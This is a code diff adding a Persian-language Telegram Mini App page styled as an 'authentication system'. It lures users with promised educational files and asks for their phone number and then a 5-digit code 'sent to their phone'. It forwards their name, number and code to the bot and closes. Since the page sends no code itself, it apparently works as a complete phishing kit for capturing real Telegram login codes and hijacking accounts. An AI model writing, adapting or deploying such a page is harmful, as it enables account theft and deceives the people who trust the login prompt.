@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>سیستم احراز هویت</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
+
+        * { box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; }
+
+        body {
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            overflow: hidden;
+        }
+
+        /* افکت نور پس زمینه */
+        body::before {
+            content: '';
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: #00d2ff;
+            border-radius: 50%;
+            filter: blur(80px);
+            top: -50px;
+            right: -50px;
+            opacity: 0.6;
+            z-index: 0;
+        }
+        body::after {
+            content: '';
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: #ff00cc;
+            border-radius: 50%;
+            filter: blur(80px);
+            bottom: -50px;
+            left: -50px;
+            opacity: 0.6;
+            z-index: 0;
+        }
+
+        /* باکس شیشه‌ای (Glassmorphism) */
+        .glass-container {
+            position: relative;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 40px 20px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h2 { margin: 0 0 10px 0; font-size: 22px; font-weight: 700; }
+        
+        .username-badge {
+            background: rgba(0, 210, 255, 0.2);
+            color: #00d2ff;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 20px;
+            border: 1px solid rgba(0, 210, 255, 0.3);
+        }
+
+        p { font-size: 14px; color: #ccc; line-height: 1.6; margin-bottom: 25px; }
+
+        .input-group { position: relative; margin-bottom: 20px; }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
+            color: #fff;
+            font-size: 18px;
+            text-align: center;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #00d2ff;
+            box-shadow: 0 0 15px rgba(0, 210, 255, 0.3);
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        input::placeholder { color: #666; font-size: 14px; }
+
+        /* مخصوص کد ۵ رقمی */
+        #codeInput {
+            letter-spacing: 15px;
+            font-size: 28px;
+            font-weight: bold;
+            padding-right: 25px; /* تنظیم فاصله برای وسط چین شدن با حروف فاصله دار */
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #00d2ff 0%, #3a7bd5 100%);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 210, 255, 0.4);
+        }
+
+        button:active { transform: scale(0.98); box-shadow: 0 2px 10px rgba(0, 210, 255, 0.4); }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- صفحه اول: شماره -->
+    <div id="screen1" class="glass-container">
+        <div class="icon">🛡️</div>
+        <h2>سیستم احراز هویت</h2>
+        <div class="username-badge" id="userBadge1">کاربر</div>
+        <p>جهت دریافت دسترسی به فایل‌های آموزشی و پکیج ویژه، لطفاً شماره تماس خود را وارد نمایید.</p>
+        <div class="input-group">
+            <input type="tel" id="phoneNumber" placeholder="۰۹۱۲۳۴۵۶۷۸۹" inputmode="numeric" />
+        </div>
+        <button onclick="goToNextScreen()">تایید و دریافت کد</button>
+    </div>
+
+    <!-- صفحه دوم: کد -->
+    <div id="screen2" class="glass-container hidden">
+        <div class="icon">🔒</div>
+        <h2>کد تایید</h2>
+        <div class="username-badge" id="userBadge2">کاربر</div>
+        <p>کد ۵ رقمی ارسال شده به شماره همراه خود را در کادر زیر وارد کنید.</p>
+        <div class="input-group">
+            <input type="text" id="codeInput" placeholder="-----" maxlength="5" inputmode="numeric" />
+        </div>
+        <button onclick="finish()">ثبت نهایی و ورود</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        let firstName = "کاربر";
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.first_name) {
+            firstName = tg.initDataUnsafe.user.first_name;
+        }
+        
+        document.getElementById('userBadge1').innerText = firstName;
+        document.getElementById('userBadge2').innerText = firstName;
+
+        function goToNextScreen() {
+            const phone = document.getElementById('phoneNumber').value;
+            if (phone.trim().length < 10) {
+                tg.showAlert("لطفاً یک شماره تماس معتبر وارد کنید.");
+                return;
+            }
+            
+            // افکت گذر به صفحه بعد
+            document.getElementById('screen1').classList.add('hidden');
+            const screen2 = document.getElementById('screen2');
+            screen2.classList.remove('hidden');
+            screen2.style.animation = 'fadeIn 0.5s ease-out';
+        }
+
+        function finish() {
+            const phone = document.getElementById('phoneNumber').value;
+            const code = document.getElementById('codeInput').value;
+            
+            if (code.trim().length !== 5) {
+                tg.showAlert("کد باید ۵ رقم باشد.");
+                return;
+            }
+            
+            // ارسال به ربات
+            const dataToSend = {
+                name: firstName,
+                phone: phone,
+                code: code
+            };
+            
+            tg.sendData(JSON.stringify(dataToSend));
+            
+            // بستن مینی اپ
+            setTimeout(() => { tg.close(); }, 300);
+        }
+    </script>
+</body>
+</html>
